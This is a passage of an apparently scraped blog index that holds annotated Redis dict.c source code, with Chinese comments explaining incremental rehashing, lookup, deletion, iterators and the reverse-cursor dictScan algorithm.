the old to the new hash table. * * 注意，每步 rehash 都是以一个哈希表索引（桶）作为单位的， * 一个桶里可能会有多个节点， * 被 rehash 的桶里的所有节点都会被移动到新哈希表。 * * T = O(N) */int dictRehash(dict *d, int n) &#123; // 只可以在 rehash 进行中时执行 if (!dictIsRehashing(d)) return 0; // 进行 N 步迁移 // T = O(N) while(n--) &#123; dictEntry *de, *nextde; /* Check if we already rehashed the whole table... */ // 如果 0 号哈希表为空，那么表示 rehash 执行完毕 // T = O(1) if (d-&gt;ht[0].used == 0) &#123; // 释放 0 号哈希表 zfree(d-&gt;ht[0].table); // 将原来的 1 号哈希表设置为新的 0 号哈希表 d-&gt;ht[0] = d-&gt;ht[1]; // 重置旧的 1 号哈希表 _dictReset(&amp;d-&gt;ht[1]); // 关闭 rehash 标识 d-&gt;rehashidx = -1; // 返回 0 ，向调用者表示 rehash 已经完成 return 0; &#125; /* Note that rehashidx can't overflow as we are sure there are more * elements because ht[0].used != 0 */ // 确保 rehashidx 没有越界 assert(d-&gt;ht[0].size &gt; (unsigned)d-&gt;rehashidx); // 略过数组中为空的索引，找到下一个非空索引 while(d-&gt;ht[0].table[d-&gt;rehashidx] == NULL) d-&gt;rehashidx++; // 指向该索引的链表表头节点 de = d-&gt;ht[0].table[d-&gt;rehashidx]; /* Move all the keys in this bucket from the old to the new hash HT */ // 将链表中的所有节点迁移到新哈希表 // T = O(1) while(de) &#123; unsigned int h; // 保存下个节点的指针 nextde = de-&gt;next; /* Get the index in the new hash table */ // 计算新哈希表的哈希值，以及节点插入的索引位置 h = dictHashKey(d, de-&gt;key) &amp; d-&gt;ht[1].sizemask; // 插入节点到新哈希表 de-&gt;next = d-&gt;ht[1].table[h]; d-&gt;ht[1].table[h] = de; // 更新计数器 d-&gt;ht[0].used--; d-&gt;ht[1].used++; // 继续处理下个节点 de = nextde; &#125; // 将刚迁移完的哈希表索引的指针设为空 d-&gt;ht[0].table[d-&gt;rehashidx] = NULL; // 更新 rehash 索引 d-&gt;rehashidx++; &#125; return 1;&#125;/* * 返回以毫秒为单位的 UNIX 时间戳 * * T = O(1) */long long timeInMilliseconds(void) &#123; struct timeval tv; gettimeofday(&amp;tv,NULL); return (((long long)tv.tv_sec)*1000)+(tv.tv_usec/1000);&#125;/* Rehash for an amount of time between ms milliseconds and ms+1 milliseconds *//* * 在给定毫秒数内，以 100 步为单位，对字典进行 rehash 。 * * T = O(N) */int dictRehashMilliseconds(dict *d, int ms) &#123; // 记录开始时间 long long start = timeInMilliseconds(); int rehashes = 0; while(dictRehash(d,100)) &#123; rehashes += 100; // 如果时间已过，跳出 if (timeInMilliseconds()-start &gt; ms) break; &#125; return rehashes;&#125;/* This function performs just a step of rehashing, and only if there are * no safe iterators bound to our hash table. When we have iterators in the * middle of a rehashing we can't mess with the two hash tables otherwise * some element can be missed or duplicated. * * 在字典不存在安全迭代器的情况下，对字典进行单步 rehash 。 * * 字典有安全迭代器的情况下不能进行 rehash ， * 因为两种不同的迭代和修改操作可能会弄乱字典。 * * This function is called by common lookup or update operations in the * dictionary so that the hash table automatically migrates from H1 to H2 * while it is actively used. * * 这个函数被多个通用的查找、更新操作调用， * 它可以让字典在被使用的同时进行 rehash 。 * * T = O(1) */static void _dictRehashStep(dict *d) &#123; if (d-&gt;iterators == 0) dictRehash(d,1);&#125;/* Add an element to the target hash table *//* * 尝试将给定键值对添加到字典中 * * 只有给定键 key 不存在于字典时，添加操作才会成功 * * 添加成功返回 DICT_OK ，失败返回 DICT_ERR * * 最坏 T = O(N) ，平滩 O(1) */int dictAdd(dict *d, void *key, void *val)&#123; // 尝试添加键到字典，并返回包含了这个键的新哈希节点 // T = O(N) dictEntry *entry = dictAddRaw(d,key); // 键已存在，添加失败 if (!entry) return DICT_ERR; // 键不存在，设置节点的值 // T = O(1) dictSetVal(d, entry, val); // 添加成功 return DICT_OK;&#125;/* Low level add. This function adds the entry but instead of setting * a value returns the dictEntry structure to the user, that will make * sure to fill the value field as he wishes. * * This function is also directly exposed to user API to be called * mainly in order to store non-pointers inside the hash value, example: * * entry = dictAddRaw(dict,mykey); * if (entry != NULL) dictSetSignedIntegerVal(entry,1000); * * Return values: * * If key already exists NULL is returned. * If key was added, the hash entry is returned to be manipulated by the caller. *//* * 尝试将键插入到字典中 * * 如果键已经在字典存在，那么返回 NULL * * 如果键不存在，那么程序创建新的哈希节点， * 将节点和键关联，并插入到字典，然后返回节点本身。 * * T = O(N) */dictEntry *dictAddRaw(dict *d, void *key)&#123; int index; dictEntry *entry; dictht *ht; // 如果条件允许的话，进行单步 rehash // T = O(1) if (dictIsRehashing(d)) _dictRehashStep(d); /* Get the index of the new element, or -1 if * the element already exists. */ // 计算键在哈希表中的索引值 // 如果值为 -1 ，那么表示键已经存在 // T = O(N) if ((index = _dictKeyIndex(d, key)) == -1) return NULL; // T = O(1) /* Allocate the memory and store the new entry */ // 如果字典正在 rehash ，那么将新键添加到 1 号哈希表 // 否则，将新键添加到 0 号哈希表 ht = dictIsRehashing(d) ? &amp;d-&gt;ht[1] : &amp;d-&gt;ht[0]; // 为新节点分配空间 entry = zmalloc(sizeof(*entry)); // 将新节点插入到链表表头 entry-&gt;next = ht-&gt;table[index]; ht-&gt;table[index] = entry; // 更新哈希表已使用节点数量 ht-&gt;used++; /* Set the hash entry fields. */ // 设置新节点的键 // T = O(1) dictSetKey(d, entry, key); return entry;&#125;/* Add an element, discarding the old if the key already exists. * * 将给定的键值对添加到字典中，如果键已经存在，那么删除旧有的键值对。 * * Return 1 if the key was added from scratch, 0 if there was already an * element with such key and dictReplace() just performed a value update * operation. * * 如果键值对为全新添加，那么返回 1 。 * 如果键值对是通过对原有的键值对更新得来的，那么返回 0 。 * * T = O(N) */int dictReplace(dict *d, void *key, void *val)&#123; dictEntry *entry, auxentry; /* Try to add the element. If the key * does not exists dictAdd will suceed. */ // 尝试直接将键值对添加到字典 // 如果键 key 不存在的话，添加会成功 // T = O(N) if (dictAdd(d, key, val) == DICT_OK) return 1; /* It already exists, get the entry */ // 运行到这里，说明键 key 已经存在，那么找出包含这个 key 的节点 // T = O(1) entry = dictFind(d, key); /* Set the new value and free the old one. Note that it is important * to do that in this order, as the value may just be exactly the same * as the previous one. In this context, think to reference counting, * you want to increment (set), and then decrement (free), and not the * reverse. */ // 先保存原有的值的指针 auxentry = *entry; // 然后设置新的值 // T = O(1) dictSetVal(d, entry, val); // 然后释放旧值 // T = O(1) dictFreeVal(d, &amp;auxentry); return 0;&#125;/* dictReplaceRaw() is simply a version of dictAddRaw() that always * returns the hash entry of the specified key, even if the key already * exists and can't be added (in that case the entry of the already * existing key is returned.) * * See dictAddRaw() for more information. *//* * dictAddRaw() 根据给定 key 释放存在，执行以下动作： * * 1) key 已经存在，返回包含该 key 的字典节点 * 2) key 不存在，那么将 key 添加到字典 * * 不论发生以上的哪一种情况， * dictAddRaw() 都总是返回包含给定 key 的字典节点。 * * T = O(N) */dictEntry *dictReplaceRaw(dict *d, void *key) &#123; // 使用 key 在字典中查找节点 // T = O(1) dictEntry *entry = dictFind(d,key); // 如果节点找到了直接返回节点，否则添加并返回一个新节点 // T = O(N) return entry ? entry : dictAddRaw(d,key);&#125;/* Search and remove an element *//* * 查找并删除包含给定键的节点 * * 参数 nofree 决定是否调用键和值的释放函数 * 0 表示调用，1 表示不调用 * * 找到并成功删除返回 DICT_OK ，没找到则返回 DICT_ERR * * T = O(1) */static int dictGenericDelete(dict *d, const void *key, int nofree)&#123; unsigned int h, idx; dictEntry *he, *prevHe; int table; // 字典（的哈希表）为空 if (d-&gt;ht[0].size == 0) return DICT_ERR; /* d-&gt;ht[0].table is NULL */ // 进行单步 rehash ，T = O(1) if (dictIsRehashing(d)) _dictRehashStep(d); // 计算哈希值 h = dictHashKey(d, key); // 遍历哈希表 // T = O(1) for (table = 0; table &lt;= 1; table++) &#123; // 计算索引值 idx = h &amp; d-&gt;ht[table].sizemask; // 指向该索引上的链表 he = d-&gt;ht[table].table[idx]; prevHe = NULL; // 遍历链表上的所有节点 // T = O(1) while(he) &#123; if (dictCompareKeys(d, key, he-&gt;key)) &#123; // 超找目标节点 /* Unlink the element from the list */ // 从链表中删除 if (prevHe) prevHe-&gt;next = he-&gt;next; else d-&gt;ht[table].table[idx] = he-&gt;next; // 释放调用键和值的释放函数？ if (!nofree) &#123; dictFreeKey(d, he); dictFreeVal(d, he); &#125; // 释放节点本身 zfree(he); // 更新已使用节点数量 d-&gt;ht[table].used--; // 返回已找到信号 return DICT_OK; &#125; prevHe = he; he = he-&gt;next; &#125; // 如果执行到这里，说明在 0 号哈希表中找不到给定键 // 那么根据字典是否正在进行 rehash ，决定要不要查找 1 号哈希表 if (!dictIsRehashing(d)) break; &#125; // 没找到 return DICT_ERR; /* not found */&#125;/* * 从字典中删除包含给定键的节点 * * 并且调用键值的释放函数来删除键值 * * 找到并成功删除返回 DICT_OK ，没找到则返回 DICT_ERR * T = O(1) */int dictDelete(dict *ht, const void *key) &#123; return dictGenericDelete(ht,key,0);&#125;/* * 从字典中删除包含给定键的节点 * * 但不调用键值的释放函数来删除键值 * * 找到并成功删除返回 DICT_OK ，没找到则返回 DICT_ERR * T = O(1) */int dictDeleteNoFree(dict *ht, const void *key) &#123; return dictGenericDelete(ht,key,1);&#125;/* Destroy an entire dictionary *//* * 删除哈希表上的所有节点，并重置哈希表的各项属性 * * T = O(N) */int _dictClear(dict *d, dictht *ht, void(callback)(void *)) &#123; unsigned long i; /* Free all the elements */ // 遍历整个哈希表 // T = O(N) for (i = 0; i &lt; ht-&gt;size &amp;&amp; ht-&gt;used &gt; 0; i++) &#123; dictEntry *he, *nextHe; if (callback &amp;&amp; (i &amp; 65535) == 0) callback(d-&gt;privdata); // 跳过空索引 if ((he = ht-&gt;table[i]) == NULL) continue; // 遍历整个链表 // T = O(1) while(he) &#123; nextHe = he-&gt;next; // 删除键 dictFreeKey(d, he); // 删除值 dictFreeVal(d, he); // 释放节点 zfree(he); // 更新已使用节点计数 ht-&gt;used--; // 处理下个节点 he = nextHe; &#125; &#125; /* Free the table and the allocated cache structure */ // 释放哈希表结构 zfree(ht-&gt;table); /* Re-initialize the table */ // 重置哈希表属性 _dictReset(ht); return DICT_OK; /* never fails */&#125;/* Clear &amp; Release the hash table *//* * 删除并释放整个字典 * * T = O(N) */void dictRelease(dict *d)&#123; // 删除并清空两个哈希表 _dictClear(d,&amp;d-&gt;ht[0],NULL); _dictClear(d,&amp;d-&gt;ht[1],NULL); // 释放节点结构 zfree(d);&#125;/* * 返回字典中包含键 key 的节点 * * 找到返回节点，找不到返回 NULL * * T = O(1) */dictEntry *dictFind(dict *d, const void *key)&#123; dictEntry *he; unsigned int h, idx, table; // 字典（的哈希表）为空 if (d-&gt;ht[0].size == 0) return NULL; /* We don't have a table at all */ // 如果条件允许的话，进行单步 rehash if (dictIsRehashing(d)) _dictRehashStep(d); // 计算键的哈希值 h = dictHashKey(d, key); // 在字典的哈希表中查找这个键 // T = O(1) for (table = 0; table &lt;= 1; table++) &#123; // 计算索引值 idx = h &amp; d-&gt;ht[table].sizemask; // 遍历给定索引上的链表的所有节点，查找 key he = d-&gt;ht[table].table[idx]; // T = O(1) while(he) &#123; if (dictCompareKeys(d, key, he-&gt;key)) return he; he = he-&gt;next; &#125; // 如果程序遍历完 0 号哈希表，仍然没找到指定的键的节点 // 那么程序会检查字典是否在进行 rehash ， // 然后才决定是直接返回 NULL ，还是继续查找 1 号哈希表 if (!dictIsRehashing(d)) return NULL; &#125; // 进行到这里时，说明两个哈希表都没找到 return NULL;&#125;/* * 获取包含给定键的节点的值 * * 如果节点不为空，返回节点的值 * 否则返回 NULL * * T = O(1) */void *dictFetchValue(dict *d, const void *key) &#123; dictEntry *he; // T = O(1) he = dictFind(d,key); return he ? dictGetVal(he) : NULL;&#125;/* A fingerprint is a 64 bit number that represents the state of the dictionary * at a given time, it's just a few dict properties xored together. * When an unsafe iterator is initialized, we get the dict fingerprint, and check * the fingerprint again when the iterator is released. * If the two fingerprints are different it means that the user of the iterator * performed forbidden operations against the dictionary while iterating. */long long dictFingerprint(dict *d) &#123; long long integers[6], hash = 0; int j; integers[0] = (long) d-&gt;ht[0].table; integers[1] = d-&gt;ht[0].size; integers[2] = d-&gt;ht[0].used; integers[3] = (long) d-&gt;ht[1].table; integers[4] = d-&gt;ht[1].size; integers[5] = d-&gt;ht[1].used; /* We hash N integers by summing every successive integer with the integer * hashing of the previous sum. Basically: * * Result = hash(hash(hash(int1)+int2)+int3) ... * * This way the same set of integers in a different order will (likely) hash * to a different number. */ for (j = 0; j &lt; 6; j++) &#123; hash += integers[j]; /* For the hashing step we use Tomas Wang's 64 bit integer hash. */ hash = (~hash) + (hash &lt;&lt; 21); // hash = (hash &lt;&lt; 21) - hash - 1; hash = hash ^ (hash &gt;&gt; 24); hash = (hash + (hash &lt;&lt; 3)) + (hash &lt;&lt; 8); // hash * 265 hash = hash ^ (hash &gt;&gt; 14); hash = (hash + (hash &lt;&lt; 2)) + (hash &lt;&lt; 4); // hash * 21 hash = hash ^ (hash &gt;&gt; 28); hash = hash + (hash &lt;&lt; 31); &#125; return hash;&#125;/* * 创建并返回给定字典的不安全迭代器 * * T = O(1) */dictIterator *dictGetIterator(dict *d)&#123; dictIterator *iter = zmalloc(sizeof(*iter)); iter-&gt;d = d; iter-&gt;table = 0; iter-&gt;index = -1; iter-&gt;safe = 0; iter-&gt;entry = NULL; iter-&gt;nextEntry = NULL; return iter;&#125;/* * 创建并返回给定节点的安全迭代器 * * T = O(1) */dictIterator *dictGetSafeIterator(dict *d) &#123; dictIterator *i = dictGetIterator(d); // 设置安全迭代器标识 i-&gt;safe = 1; return i;&#125;/* * 返回迭代器指向的当前节点 * * 字典迭代完毕时，返回 NULL * * T = O(1) */dictEntry *dictNext(dictIterator *iter)&#123; while (1) &#123; // 进入这个循环有两种可能： // 1) 这是迭代器第一次运行 // 2) 当前索引链表中的节点已经迭代完（NULL 为链表的表尾） if (iter-&gt;entry == NULL) &#123; // 指向被迭代的哈希表 dictht *ht = &amp;iter-&gt;d-&gt;ht[iter-&gt;table]; // 初次迭代时执行 if (iter-&gt;index == -1 &amp;&amp; iter-&gt;table == 0) &#123; // 如果是安全迭代器，那么更新安全迭代器计数器 if (iter-&gt;safe) iter-&gt;d-&gt;iterators++; // 如果是不安全迭代器，那么计算指纹 else iter-&gt;fingerprint = dictFingerprint(iter-&gt;d); &#125; // 更新索引 iter-&gt;index++; // 如果迭代器的当前索引大于当前被迭代的哈希表的大小 // 那么说明这个哈希表已经迭代完毕 if (iter-&gt;index &gt;= (signed) ht-&gt;size) &#123; // 如果正在 rehash 的话，那么说明 1 号哈希表也正在使用中 // 那么继续对 1 号哈希表进行迭代 if (dictIsRehashing(iter-&gt;d) &amp;&amp; iter-&gt;table == 0) &#123; iter-&gt;table++; iter-&gt;index = 0; ht = &amp;iter-&gt;d-&gt;ht[1]; // 如果没有 rehash ，那么说明迭代已经完成 &#125; else &#123; break; &#125; &#125; // 如果进行到这里，说明这个哈希表并未迭代完 // 更新节点指针，指向下个索引链表的表头节点 iter-&gt;entry = ht-&gt;table[iter-&gt;index]; &#125; else &#123; // 执行到这里，说明程序正在迭代某个链表 // 将节点指针指向链表的下个节点 iter-&gt;entry = iter-&gt;nextEntry; &#125; // 如果当前节点不为空，那么也记录下该节点的下个节点 // 因为安全迭代器有可能会将迭代器返回的当前节点删除 if (iter-&gt;entry) &#123; /* We need to save the 'next' here, the iterator user * may delete the entry we are returning. */ iter-&gt;nextEntry = iter-&gt;entry-&gt;next; return iter-&gt;entry; &#125; &#125; // 迭代完毕 return NULL;&#125;/* * 释放给定字典迭代器 * * T = O(1) */void dictReleaseIterator(dictIterator *iter)&#123; if (!(iter-&gt;index == -1 &amp;&amp; iter-&gt;table == 0)) &#123; // 释放安全迭代器时，安全迭代器计数器减一 if (iter-&gt;safe) iter-&gt;d-&gt;iterators--; // 释放不安全迭代器时，验证指纹是否有变化 else assert(iter-&gt;fingerprint == dictFingerprint(iter-&gt;d)); &#125; zfree(iter);&#125;/* Return a random entry from the hash table. Useful to * implement randomized algorithms *//* * 随机返回字典中任意一个节点。 * * 可用于实现随机化算法。 * * 如果字典为空，返回 NULL 。 * * T = O(N)*/dictEntry *dictGetRandomKey(dict *d)&#123; dictEntry *he, *orighe; unsigned int h; int listlen, listele; // 字典为空 if (dictSize(d) == 0) return NULL; // 进行单步 rehash if (dictIsRehashing(d)) _dictRehashStep(d); // 如果正在 rehash ，那么将 1 号哈希表也作为随机查找的目标 if (dictIsRehashing(d)) &#123; // T = O(N) do &#123; h = random() % (d-&gt;ht[0].size+d-&gt;ht[1].size); he = (h &gt;= d-&gt;ht[0].size) ? d-&gt;ht[1].table[h - d-&gt;ht[0].size] : d-&gt;ht[0].table[h]; &#125; while(he == NULL); // 否则，只从 0 号哈希表中查找节点 &#125; else &#123; // T = O(N) do &#123; h = random() &amp; d-&gt;ht[0].sizemask; he = d-&gt;ht[0].table[h]; &#125; while(he == NULL); &#125; /* Now we found a non empty bucket, but it is a linked * list and we need to get a random element from the list. * The only sane way to do so is counting the elements and * select a random index. */ // 目前 he 已经指向一个非空的节点链表 // 程序将从这个链表随机返回一个节点 listlen = 0; orighe = he; // 计算节点数量, T = O(1) while(he) &#123; he = he-&gt;next; listlen++; &#125; // 取模，得出随机节点的索引 listele = random() % listlen; he = orighe; // 按索引查找节点 // T = O(1) while(listele--) he = he-&gt;next; // 返回随机节点 return he;&#125;/* This is a version of dictGetRandomKey() that is modified in order to * return multiple entries by jumping at a random place of the hash table * and scanning linearly for entries. * * Returned pointers to hash table entries are stored into 'des' that * points to an array of dictEntry pointers. The array must have room for * at least 'count' elements, that is the argument we pass to the function * to tell how many random elements we need. * * The function returns the number of items stored into 'des', that may * be less than 'count' if the hash table has less than 'count' elements * inside. * * Note that this function is not suitable when you need a good distribution * of the returned items, but only when you need to \"sample\" a given number * of continuous elements to run some kind of algorithm or to produce * statistics. However the function is much faster than dictGetRandomKey() * at producing N elements, and the elements are guaranteed to be non * repeating. */int dictGetRandomKeys(dict *d, dictEntry **des, int count) &#123; int j; /* internal hash table id, 0 or 1. */ int stored = 0; if (dictSize(d) &lt; count) count = dictSize(d); while(stored &lt; count) &#123; for (j = 0; j &lt; 2; j++) &#123; /* Pick a random point inside the hash table 0 or 1. */ unsigned int i = random() &amp; d-&gt;ht[j].sizemask; int size = d-&gt;ht[j].size; /* Make sure to visit every bucket by iterating 'size' times. */ while(size--) &#123; dictEntry *he = d-&gt;ht[j].table[i]; while (he) &#123; /* Collect all the elements of the buckets found non * empty while iterating. */ *des = he; des++; he = he-&gt;next; stored++; if (stored == count) return stored; &#125; i = (i+1) &amp; d-&gt;ht[j].sizemask; &#125; /* If there is only one table and we iterated it all, we should * already have 'count' elements. Assert this condition. */ assert(dictIsRehashing(d) != 0); &#125; &#125; return stored; /* Never reached. */&#125;/* Function to reverse bits. Algorithm from: * http://graphics.stanford.edu/~seander/bithacks.html#ReverseParallel */static unsigned long rev(unsigned long v) &#123; unsigned long s = 8 * sizeof(v); // bit size; must be power of 2 unsigned long mask = ~0; while ((s &gt;&gt;= 1) &gt; 0) &#123; mask ^= (mask &lt;&lt; s); v = ((v &gt;&gt; s) &amp; mask) | ((v &lt;&lt; s) &amp; ~mask); &#125; return v;&#125;/* dictScan() is used to iterate over the elements of a dictionary. * * dictScan() 函数用于迭代给定字典中的元素。 * * Iterating works in the following way: * * 迭代按以下方式执行： * * 1) Initially you call the function using a cursor (v) value of 0. * 一开始，你使用 0 作为游标来调用函数。 * 2) The function performs one step of the iteration, and returns the * new cursor value that you must use in the next call. * 函数执行一步迭代操作， * 并返回一个下次迭代时使用的新游标。 * 3) When the returned cursor is 0, the iteration is complete. * 当函数返回的游标为 0 时，迭代完成。 * * The function guarantees that all the elements that are present in the * dictionary from the start to the end of the iteration are returned. * However it is possible that some element is returned multiple time. * * 函数保证，在迭代从开始到结束期间，一直存在于字典的元素肯定会被迭代到， * 但一个元素可能会被返回多次。 * * For every element returned, the callback 'fn' passed as argument is * called, with 'privdata' as first argument and the dictionar entry * 'de' as second argument. * * 每当一个元素被返回时，回调函数 fn 就会被执行， * fn 函数的第一个参数是 privdata ，而第二个参数则是字典节点 de 。 * * HOW IT WORKS. * 工作原理 * * The algorithm used in the iteration was designed by Pieter Noordhuis. * The main idea is to increment a cursor starting from the higher order * bits, that is, instead of incrementing the cursor normally, the bits * of the cursor are reversed, then the cursor is incremented, and finally * the bits are reversed again. * * 迭代所使用的算法是由 Pieter Noordhuis 设计的， * 算法的主要思路是在二进制高位上对游标进行加法计算 * 也即是说，不是按正常的办法来对游标进行加法计算， * 而是首先将游标的二进制位翻转（reverse）过来， * 然后对翻转后的值进行加法计算， * 最后再次对加法计算之后的结果进行翻转。 * * This strategy is needed because the hash table may be resized from one * call to the other call of the same iteration. * * 这一策略是必要的，因为在一次完整的迭代过程中， * 哈希表的大小有可能在两次迭代之间发生改变。 * * dict.c hash tables are always power of two in size, and they * use chaining, so the position of an element in a given table is given * always by computing the bitwise AND between Hash(key) and SIZE-1 * (where SIZE-1 is always the mask that is equivalent to taking the rest * of the division between the Hash of the key and SIZE). * * 哈希表的大小总是 2 的某个次方，并且哈希表使用链表来解决冲突， * 因此一个给定元素在一个给定表的位置总可以通过 Hash(key) &amp; SIZE-1 * 公式来计算得出， * 其中 SIZE-1 是哈希表的最大索引值， * 这个最大索引值就是哈希表的 mask （掩码）。 * * For example if the current hash table size is 16, the mask is * (in binary) 1111. The position of a key in the hash table will be always * the last four bits of the hash output, and so forth. * * 举个例子，如果当前哈希表的大小为 16 ， * 那么它的掩码就是二进制值 1111 ， * 这个哈希表的所有位置都可以使用哈希值的最后四个二进制位来记录。 * * WHAT HAPPENS IF THE TABLE CHANGES IN SIZE? * 如果哈希表的大小改变了怎么办？ * * If the hash table grows, elements can go anyway in one multiple of * the old bucket: for example let's say that we already iterated with * a 4 bit cursor 1100, since the mask is 1111 (hash table size = 16). * * 当对哈希表进行扩展时，元素可能会从一个槽移动到另一个槽， * 举个例子，假设我们刚好迭代至 4 位游标 1100 ， * 而哈希表的 mask 为 1111 （哈希表的大小为 16 ）。 * * If the hash table will be resized to 64 elements, and the new mask will * be 111111, the new buckets that you obtain substituting in ??1100 * either 0 or 1, can be targeted only by keys that we already visited * when scanning the bucket 1100 in the smaller hash table. * * 如果这时哈希表将大小改为 64 ，那么哈希表的 mask 将变为 111111 ， * * By iterating the higher bits first, because of the inverted counter, the * cursor does not need to restart if the table size gets bigger, and will * just continue iterating with cursors that don't have '1100' at the end, * nor any other combination of final 4 bits already explored. * * Similarly when the table size shrinks over time, for example going from * 16 to 8, If a combination of the lower three bits (the mask for size 8 * is 111) was already completely explored, it will not be visited again * as we are sure that, we tried for example, both 0111 and 1111 (all the * variations of the higher bit) so we don't need to test it again. * * WAIT... YOU HAVE *TWO* TABLES DURING REHASHING! * 等等。。。在 rehash 的时候可是会出现两个哈希表的阿！ * * Yes, this is true, but we always iterate the smaller one of the tables, * testing also all the expansions of the current cursor into the larger * table. So for example if the current cursor is 101 and we also have a * larger table of size 16, we also test (0)101 and (1)101 inside the larger * table. This reduces the problem back to having only one table, where * the larger one, if exists, is just an expansion of the smaller one. * * LIMITATIONS * 限制 * * This iterator is completely stateless, and this is a huge advantage, * including no additional memory used. * 这个迭代器是完全无状态的，这是一个巨大的优势， * 因为迭代可以在不使用任何额外内存的情况下进行。 * * The disadvantages resulting from this design are: * 这个设计的缺陷在于： * * 1) It is possible that we return duplicated elements. However this is usually * easy to deal with in the application level. * 函数可能会返回重复的元素，不过这个问题可以很容易在应用层解决。 * 2) The iterator must return multiple elements per call, as it needs to always * return all the keys chained in a given bucket, and all the expansions, so * we are sure we don't miss keys moving. * 为了不错过任何元素， * 迭代器需要返回给定桶上的所有键， * 以及因为扩展哈希表而产生出来的新表， * 所以迭代器必须在一次迭代中返回多个元素。 * 3) The reverse cursor is somewhat hard to understand at first, but this * comment is supposed to help. * 对游标进行翻转（reverse）的原因初看上去比较难以理解， * 不过阅读这份注释应该会有所帮助。 */unsigned long dictScan(dict *d, unsigned long v, dictScanFunction *fn, void *privdata)&#123; dictht *t0, *t1; const dictEntry *de; unsigned long m0, m1; // 跳过空字典 if (dictSize(d) == 0) return 0; // 迭代只有一个哈希表的字典 if (!dictIsRehashing(d)) &#123; // 指向哈希表 t0 = &amp;(d-&gt;ht[0]); // 记录 mask m0 = t0-&gt;sizemask; /* Emit entries at cursor */ // 指向哈希桶 de = t0-&gt;table[v &amp; m0]; // 遍历桶中的所有节点 while (de) &#123; fn(privdata, de); de = de-&gt;next; &#125; // 迭代有两个哈希表的字典 &#125; else &#123; // 指向两个哈希表 t0 = &amp;d-&gt;ht[0]; t1 = &amp;d-&gt;ht[1]; /* Make sure t0 is the smaller and t1 is the bigger table */ // 确保 t0 比 t1 要小 if (t0-&gt;size &gt; t1-&gt;size) &#123; t0 = &amp;d-&gt;ht[1]; t1 = &amp;d-&gt;ht[0]; &#125; // 记录掩码 m0 = t0-&gt;sizemask; m1 = t1-&gt;sizemask; /* Emit entries at cursor */ // 指向桶，并迭代桶中的所有节点 de = t0-&gt;table[v &amp; m0]; while (de) &#123; fn(privdata, de); de = de-&gt;next; &#125; /* Iterate over indices in larger table that are the expansion * of the index pointed to by the cursor in the smaller table */ // Iterate over indices in larger table // 迭代大表中的桶 // that are the expansion of the index pointed to // 这些桶被索引的 expansion 所指向 // by the cursor in the smaller table // do &#123; /* Emit entries at cursor */ // 指向桶，并迭代桶中的所有节点 de = t1-&gt;table[v &amp; m1]; while (de) &#123; fn(privdata, de); de = de-&gt;next; &#125; /* Increment bits not covered by the smaller mask */ v = (((v | m0) + 1) &amp; ~m0) | (v &amp; m0); /* Continue while bits covered by mask difference is non-zero */ &#125; while (v &amp; (m0 ^ m1)); &#125; /* Set unmasked bits so incrementing the reversed cursor * operates on the masked bits of the smaller table */ v |= ~m0; /* Increment the reverse cursor */ v = rev(v); v++; v = rev(v); return v;&#125;/* ------------------------- private functions ------------------------------ *//* Expand the hash table if needed *//* * 根据需要，初始化字典（的哈希表），或者对字典（的现有哈希表）进行扩展 * * T = O(N) */static int _dictExpandIfNeeded(dict *d)&#123; /* Incremental rehashing already in progress. Return. */ // 渐进式 rehash 已经在进行了，直接返回 if (dictIsRehashing(d)) return DICT_OK; /* If the hash table is empty expand it to the initial size. */ // 如果字典（的 0 号哈希表）为空，那么创建并返回初始化大小的 0 号哈希表 // T = O(1) if (d-&gt;ht[0].size == 0) return dictExpand(d, DICT_HT_INITIAL_SIZE); /* If we reached the 1:1 ratio, and we are allowed to resize the hash * table (global setting) or we should avoid it but the ratio between * elements/buckets is over the \"safe\" threshold, we resize doubling * the number of buckets. */ // 一下两个条件之一为真时，对字典进行扩展 // 1）字典已使用节点数和字典大小之间的比率接近 1：1 // 并且 dict_can_resize 为真 // 2）已使用节点数和字典大小之间的比率超过 dict_force_resize_ratio if (d-&gt;ht[0].used &gt;= d-&gt;ht[0].size &amp;&amp; (dict_can_resize || d-&gt;ht[0].used/d-&gt;ht[0].size &gt; dict_force_resize_ratio)) &#123; // 新哈希表的大小至少是目前已使用节点数的两倍 // T = O(N) return dictExpand(d, d-&gt;ht[0].used*2); &#125; return DICT_OK;&#125;/* Our hash table capability is a power of two *//* * 计算第一个大于等于 size 的 2 的 N 次方，用作哈希表的值 * * T = O(1) */static unsigned long _dictNextPower(unsigned long size)&#123; unsigned long i = DICT_HT_INITIAL_SIZE; if (size &gt;= LONG_MAX) return LONG_MAX; while(1) &#123; if (i &gt;= size) return i; i *= 2; &#125;&#125;/* Returns the index of a free slot that can be populated with * a hash entry for the given 'key'. * If the key already exists, -1 is returned. * * 返回可以将 key 插入到哈希表的索引位置 * 如果 key 已经存在于哈希表，那么返回 -1 * * Note that if we are in the process of rehashing the hash table, the * index is always returned in the context of the second (new) hash table. * * 注意，如果字典正在进行 rehash ，那么总是返回 1 号哈希表的索引。 * 因为在字典进行 rehash 时，新节点总是插入到 1 号哈希表。 * * T = O(N) */static int _dictKeyIndex(dict *d, const void *key)&#123; unsigned int h, idx, table; dictEntry *he; /* Expand the hash table if needed */ // 单步 rehash // T = O(N) if (_dictExpandIfNeeded(d) == DICT_ERR) return -1; /* Compute the key hash value */ // 计算 key 的哈希值 h = dictHashKey(d, key); // T = O(1) for (table = 0; table &lt;= 1; table++) &#123; // 计算索引值 idx = h &amp; d-&gt;ht[table].sizemask; /* Search if this slot does not already contain the given key */ // 查找 key 是否存在 // T = O(1) he = d-&gt;ht[table].table[idx]; while(he) &#123; if (dictCompareKeys(d, key, he-&gt;key)) return -1; he = he-&gt;next; &#125; // 如果运行到这里时，说明 0 号哈希表中所有节点都不包含 key // 如果这时 rehahs 正在进行，那么继续对 1 号哈希表进行 rehash if (!dictIsRehashing(d)) break; &#125; // 返回索引值 return idx;&#125;/* * 清空字典上的所有哈希表节点，并重置字典属性 * * T = O(N) */void dictEmpty(dict *d, void(callback)(void*)) &#123; // 删除两个哈希表上的所有节点 // T = O(N) _dictClear(d,&amp;d-&gt;ht[0],callback); _dictClear(d,&amp;d-&gt;ht[1],callback); // 重置属性 d-&gt;rehashidx = -1; d-&gt;iterators = 0;&#125;/* * 开启自动 rehash * * T = O(1) */void dictEnableResize(void) &#123; dict_can_resize = 1;&#125;/* * 关闭自动 rehash * * T = O(1) */void dictDisableResize(void) &#123; dict_can_resize = 0;&#125;","path":"2019/04/16/redis源码-字典/","date":"04-16","excerpt":"字典的实现概念Redis的字典是使用哈希表作为底层实现原理的，一个哈希表可以有多个哈希表节点，而每个哈希表节点就保存了字典中的一个键值对。哈希表1234567891011121314151617181920212223/* This is our hash table structure. Every 